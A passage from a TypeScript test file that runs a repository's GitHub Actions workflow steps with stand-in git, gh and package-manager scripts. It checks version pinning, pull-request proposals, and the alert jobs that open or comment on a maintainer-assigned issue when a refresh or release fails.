    commands: { git: fakeGit(), gh: fakeGh({}) },
    env: { ...PR_ENV, CHANGED: 'false', SERVER: '0.14.1', VERSION: '', GH_TOKEN: APP_TOKEN },
  });
  assert.notEqual(propose.status, 0, propose.log);
  assert.deepEqual(propose.calls, [], 'propose pushed or opened something without a version');
});

test('a pin-only run proposes package.json and pnpm-lock.yaml alone, at the same version, and says nothing publishes', () => {
  // Deterministic, as the runner would chain the steps: the recompute with a stand-in pnpm, the version step, and
  // propose with a stand-in git and gh, each in the checkout the step before it left.
  const recompute = runStep(stepScript(workflow(), 'recompute'), {
    files: { 'package.json': manifestWithPin('0.13.1', '3.2.1'), 'pnpm-lock.yaml': LOCK, 'index.db': 'committed index' },
    commands: { pnpm: fakePinPnpm() },
    env: { SERVER: '0.14.1' },
  });
  assert.equal(recompute.status, 0, recompute.log);
  assert.equal(recompute.checkout['package.json'], manifestWithPin('0.14.1', '3.2.1'));

  const version = runStep(stepScript(workflow(), 'version'), {
    files: recompute.checkout,
    commands: { npm: `process.stdout.write('["3.2.0", "3.2.1"]\\n');\n` },
    env: { CHANGED: 'false', LEVEL: 'patch' },
  });
  assert.equal(version.status, 0, version.log);
  assert.equal(version.output, 'version=3.2.1\n', 'a pin-only run changed the version');
  assert.deepEqual(commandsOf(version.calls), ['npm']);

  const propose = runStep(stepScript(workflow(), 'propose'), {
    files: version.checkout,
    commands: { git: fakeGit(), gh: fakeGh({}) },
    env: { ...PR_ENV, CHANGED: 'false', SERVER: '0.14.1', VERSION: stepOutputs(version.output)['version']!, COMMITTED: DIGEST_A, REBUILT: DIGEST_A, GH_TOKEN: APP_TOKEN },
  });
  assert.equal(propose.status, 0, propose.log);
  assert.equal(propose.checkout['package.json'], manifestWithPin('0.14.1', '3.2.1'), 'propose changed package.json');
  assert.equal(propose.checkout['index.db'], 'committed index', 'propose changed index.db');
  const git = propose.calls.filter((call) => call.command === 'git').map((call) => call.args);
  assert.deepEqual(git.filter((args) => args[0] === 'add').map((args) => args.slice(1).sort()), [['package.json', 'pnpm-lock.yaml']],
    'the pin-only commit does not stage exactly package.json and pnpm-lock.yaml');
  const create = ghCalls(propose.calls).find((args) => args.includes('--method'))!;
  const fields = flagValues(create, '-f');
  assert.ok(fields.includes('title=chore: pin the server at 0.14.1'), `unexpected title in ${fields.join(' | ')}`);
  const body = fields.find((field) => field.startsWith('body='));
  assert.match(body ?? '', /publishes nothing/, `the body does not say nothing publishes: ${body}`);
  assert.match(body ?? '', /3\.2\.1/, 'the body does not name the version that stays');
  assert.doesNotMatch(body ?? '', /refreshed index/, 'the body speaks of a refreshed index');
  assert.deepEqual(ghCalls(propose.calls).find((args) => args[0] === 'pr'), ['pr', 'merge', '12', '--auto', '--rebase'],
    'a pin-only pull request does not merge by itself');
});

/** The title the alert job looks for and opens its issue with. */
const ALERT_TITLE = 'Automation needs a look';

const ALERT_ENV = {
  GH_TOKEN: 'stand-in-token-value',
  BUILD_RESULT: 'success',
  PR_RESULT: 'success',
  HOLD: 'true',
  REASONS,
  GITHUB_REPOSITORY: 'tibia-sh/tibiawiki-data',
  GITHUB_SERVER_URL: 'https://github.com',
  GITHUB_RUN_ID: '4242',
};

const BOT = { login: 'github-actions[bot]' };
const ALERT_ISSUE = { number: 30, title: ALERT_TITLE, user: BOT };
/** Issues the alert job must pass over: the title by another author, a pull request, another title. */
const NOT_ALERT_ISSUES = [
  { number: 31, title: ALERT_TITLE, user: { login: 'drptbl' } },
  { number: 32, title: ALERT_TITLE, user: BOT, pull_request: { url: 'https://api.github.com/repos/tibia-sh/tibiawiki-data/pulls/32' } },
  { number: 33, title: `${ALERT_TITLE} again`, user: BOT },
];

/** A stand-in gh that lists `issues` as one page, answers a write with a URL, and exits `listExit` for the list. */
const fakeAlertGh = (issues: unknown[], listExit = 0): string =>
  `const args = process.argv.slice(2);\n` +
  `if (args.includes('--method')) process.stdout.write('https://github.com/tibia-sh/tibiawiki-data/issues/40\\n');\n` +
  `else { process.stdout.write(${JSON.stringify(`${JSON.stringify([issues])}\n`)}); process.exitCode = ${listExit}; }\n`;

const runAlert = (issues: unknown[], env: Record<string, string> = ALERT_ENV, listExit = 0) =>
  runStep(stepScript(workflow(), 'alert'), { commands: { gh: fakeAlertGh(issues, listExit) }, env });

test('the alert comments on the open alert issue with the run and the reasons it held', () => {
  const run = runAlert([...NOT_ALERT_ISSUES, ALERT_ISSUE]);
  assert.equal(run.status, 0, run.log);
  const gh = ghCalls(run.calls);
  const [list, ...writes] = gh;
  assert.ok(list!.some((arg) => arg === 'repos/tibia-sh/tibiawiki-data/issues?state=open&per_page=100'), `unexpected list call: ${list!.join(' ')}`);
  assert.ok(list!.includes('--paginate') && list!.includes('--slurp'), 'the list does not read every page');
  assert.equal(writes.length, 1, 'expected exactly one write');
  assert.deepEqual(flagValues(writes[0]!, '--method'), ['POST']);
  assert.ok(writes[0]!.includes('repos/tibia-sh/tibiawiki-data/issues/30/comments'), `the comment is not on issue 30: ${writes[0]!.join(' ')}`);
  assert.deepEqual(flagValues(writes[0]!, '-f'), [
    'body=Run: https://github.com/tibia-sh/tibiawiki-data/actions/runs/4242\n\nThe refresh was held for review:\n\n' +
      '- item lost 150 of 9,800 rows (1.5%)\n- table npc_job is missing',
  ]);
});

test('the alert opens the issue, assigned to the maintainer, when none of the open ones is its own', () => {
  for (const issues of [[], NOT_ALERT_ISSUES]) {
    const run = runAlert(issues);
    assert.equal(run.status, 0, run.log);
    const writes = ghCalls(run.calls).filter((args) => args.includes('--method'));
    assert.equal(writes.length, 1, 'expected exactly one write');
    assert.deepEqual(flagValues(writes[0]!, '--method'), ['POST']);
    assert.ok(writes[0]!.includes('repos/tibia-sh/tibiawiki-data/issues'), `the issue is not opened: ${writes[0]!.join(' ')}`);
    const fields = flagValues(writes[0]!, '-f');
    assert.ok(fields.includes(`title=${ALERT_TITLE}`), `unexpected title in ${fields.join(' | ')}`);
    assert.ok(fields.includes('assignees[]=drptbl'), 'the issue is not assigned to drptbl');
    const body = fields.find((field) => field.startsWith('body='));
    assert.ok(body?.endsWith('Run: https://github.com/tibia-sh/tibiawiki-data/actions/runs/4242\n\nThe refresh was held for review:\n\n' +
      '- item lost 150 of 9,800 rows (1.5%)\n- table npc_job is missing'), `the issue body does not end with the alert: ${body}`);
    assert.ok((body?.length ?? 0) > 'body=Run: '.length + 200, 'the issue body does not say what the issue is for');
  }
});

test('the alert names each job that did not succeed, and its result', () => {
  const cases: Array<[Record<string, string>, string[]]> = [
    [{ BUILD_RESULT: 'failure', PR_RESULT: 'skipped' }, ['build', 'failure']],
    [{ BUILD_RESULT: 'cancelled', PR_RESULT: 'skipped' }, ['build', 'cancelled']],
    [{ PR_RESULT: 'failure' }, ['pr', 'failure']],
    [{ PR_RESULT: 'cancelled' }, ['pr', 'cancelled']],
  ];
  for (const [env, [job, result]] of cases) {
    const run = runAlert([ALERT_ISSUE], { ...ALERT_ENV, HOLD: 'false', REASONS: '', ...env });
    assert.equal(run.status, 0, run.log);
    const writes = ghCalls(run.calls).filter((args) => args.includes('--method'));
    assert.deepEqual(flagValues(writes[0]!, '-f'),
      [`body=Run: https://github.com/tibia-sh/tibiawiki-data/actions/runs/4242\n\nThe ${job} job did not succeed. Its result is ${result}.`]);
  }
  // A pr job skipped because nothing changed, or because the build failed, is not named.
  const held = runAlert([ALERT_ISSUE], { ...ALERT_ENV, PR_RESULT: 'skipped' });
  assert.equal(held.status, 0, held.log);
  assert.doesNotMatch(flagValues(ghCalls(held.calls).find((args) => args.includes('--method'))!, '-f')[0]!, /pr job/);
});

test('the alert opens nothing when it cannot list the open issues', () => {
  // Opening one then would put a second alert issue beside the first.
  const run = runAlert([ALERT_ISSUE], ALERT_ENV, 1);
  assert.notEqual(run.status, 0, `the step passed when the list failed\n${run.log}`);
  assert.equal(ghCalls(run.calls).filter((args) => args.includes('--method')).length, 0, 'the step wrote after the list failed');
});

/**
 * alert.yml writes the same issue for release.yml, the one workflow besides drift that runs by itself and can fail
 * with nobody watching. Its checks sit here, beside drift's alert, because both jobs must find and open one issue by
 * one rule.
 */
const alertWorkflow = (): string => read('alert.yml');
const releaseAlertJob = (): string => under(under(code(alertWorkflow()), 'jobs'), 'alert');

/** The condition of alert.yml's job: a release run that did not pass. */
const RELEASE_ALERT_IF =
  "${{ github.event.workflow_run.conclusion != 'success' && github.event.workflow_run.conclusion != 'skipped' && github.event.workflow_run.conclusion != 'neutral' }}";

const RELEASE_ALERT_ENV = {
  GH_TOKEN: 'stand-in-token-value',
  GH_REPO: 'tibia-sh/tibiawiki-data',
  WORKFLOW: 'release',
  CONCLUSION: 'failure',
  RUN_URL: 'https://github.com/tibia-sh/tibiawiki-data/actions/runs/99',
};

const RELEASE_ALERT_TEXT = 'Run: https://github.com/tibia-sh/tibiawiki-data/actions/runs/99\n\nThe release workflow did not succeed. Its conclusion is failure.';

const runReleaseAlert = (issues: unknown[], listExit = 0) =>
  runStep(stepScript(alertWorkflow(), 'alert'), { commands: { gh: fakeAlertGh(issues, listExit) }, env: RELEASE_ALERT_ENV });

test('alert.yml runs for a release run, matched by release.yml\'s exact name', () => {
  // workflow_run matches a workflow by its name:, and a name that matches none runs nothing, with no error.
  const on = under(code(alertWorkflow()), 'on');
  assert.deepEqual(keys(on), ['workflow_run'], 'alert.yml runs on something besides workflow_run');
  const trigger = under(on, 'workflow_run');
  assert.deepEqual(keys(trigger).sort(), ['types', 'workflows']);
  const name = scalar(code(read('release.yml')), 'name');
  assert.equal(name, 'release', 'release.yml is not named release');
  assert.equal(scalar(trigger, 'workflows'), `[${name}]`, 'alert.yml does not watch release.yml alone');
  assert.equal(scalar(trigger, 'types'), '[completed]');
  assert.equal(scalar(releaseAlertJob(), 'if'), RELEASE_ALERT_IF, 'alert.yml does not alert on every release run that did not pass');
});

test('alert.yml grants nothing by default, and its one job comments with github.token and checks nothing out', () => {
  assert.match(code(alertWorkflow()), /^permissions: *\{\}$/m, 'the workflow-level permissions grant something');
  assert.deepEqual(keys(under(code(alertWorkflow()), 'jobs')), ['alert']);
  const job = releaseAlertJob();
  assert.deepEqual(sortedLines(under(job, 'permissions')), ['issues: write']);
  assert.equal(scalar(job, 'runs-on'), 'ubuntu-latest');
  assert.equal(scalar(job, 'timeout-minutes'), '5', 'the alert job is not bounded at 5 minutes');
  assert.doesNotMatch(job, /^ *(?:- +)?uses:/m, 'the alert job runs an action');
  const list = steps(job);
  assert.equal(list.length, 1, 'expected exactly one alert job step');
  stepIndex(list, 'alert');
  assert.deepEqual(sortedLines(under(stepBody(list[0]!), 'env')), [
    'CONCLUSION: ${{ github.event.workflow_run.conclusion }}',
    'GH_REPO: ${{ github.repository }}',
    'GH_TOKEN: ${{ github.token }}',
    'RUN_URL: ${{ github.event.workflow_run.html_url }}',
    'WORKFLOW: ${{ github.event.workflow_run.name }}',
  ], 'the alert step does not get exactly github.token, the repository and the run');
  assert.equal(runScripts(alertWorkflow()).find((script) => script.includes('${{')), undefined, 'a run: script interpolates an expression');
});

test('drift and release find and open the alert issue by one rule, with one text', () => {
  // A person's issue with the title, found by one and passed over by the other, would split the alerts in two.
  const lookup = (file: string) => /number=\$\(node -e '([\s\S]*?)' "\$issues" "\$title"\)/.exec(stepScript(read(file), 'alert'))?.[1];
  const intro = (file: string) => /^ *intro='(.*)'$/m.exec(stepScript(read(file), 'alert'))?.[1];
  assert.ok(lookup('drift.yml'), 'drift.yml finds its issue some other way');
  assert.equal(lookup('alert.yml'), lookup('drift.yml'), 'alert.yml finds its issue by another rule');
  assert.ok(intro('drift.yml'), 'drift.yml opens its issue with no intro');
  assert.equal(intro('alert.yml'), intro('drift.yml'), 'alert.yml opens its issue with another intro');
});

test('the release alert comments on the open alert issue with the run and its conclusion', () => {
  const run = runReleaseAlert([...NOT_ALERT_ISSUES, ALERT_ISSUE]);
  assert.equal(run.status, 0, run.log);
  const [list, ...writes] = ghCalls(run.calls);
  assert.ok(list!.includes('repos/tibia-sh/tibiawiki-data/issues?state=open&per_page=100'), `unexpected list call: ${list!.join(' ')}`);
  assert.ok(list!.includes('--paginate') && list!.includes('--slurp'), 'the list does not read every page');
  assert.equal(writes.length, 1, 'expected exactly one write');
  assert.deepEqual(flagValues(writes[0]!, '--method'), ['POST']);
  assert.ok(writes[0]!.includes('repos/tibia-sh/tibiawiki-data/issues/30/comments'), `the comment is not on issue 30: ${writes[0]!.join(' ')}`);
  assert.deepEqual(flagValues(writes[0]!, '-f'), [`body=${RELEASE_ALERT_TEXT}`]);
});

test('the release alert opens the issue, assigned to the maintainer, when none of the open ones is its own', () => {
  for (const issues of [[], NOT_ALERT_ISSUES]) {
    const run = runReleaseAlert(issues);
    assert.equal(run.status, 0, run.log);
    const writes = ghCalls(run.calls).filter((args) => args.includes('--method'));
    assert.equal(writes.length, 1, 'expected exactly one write');
    assert.ok(writes[0]!.includes('repos/tibia-sh/tibiawiki-data/issues'), `the issue is not opened: ${writes[0]!.join(' ')}`);
    const fields = flagValues(writes[0]!, '-f');
    assert.ok(fields.includes(`title=${ALERT_TITLE}`), `unexpected title in ${fields.join(' | ')}`);
    assert.ok(fields.includes('assignees[]=drptbl'), 'the issue is not assigned to drptbl');
    const body = fields.find((field) => field.startsWith('body='));
    assert.ok(body?.endsWith(`\n\n${RELEASE_ALERT_TEXT}`), `the issue body does not end with the alert: ${body}`);
    assert.ok((body?.length ?? 0) > `body=${RELEASE_ALERT_TEXT}`.length + 100, 'the issue body does not say what the issue is for');
  }
});

test('the release alert opens nothing when it cannot list the open issues', () => {
  const run = runReleaseAlert([ALERT_ISSUE], 1);
  assert.notEqual(run.status, 0, `the step passed when the list failed\n${run.log}`);
  assert.equal(ghCalls(run.calls).filter((args) => args.includes('--method')).length, 0, 'the step wrote after the list failed');
});
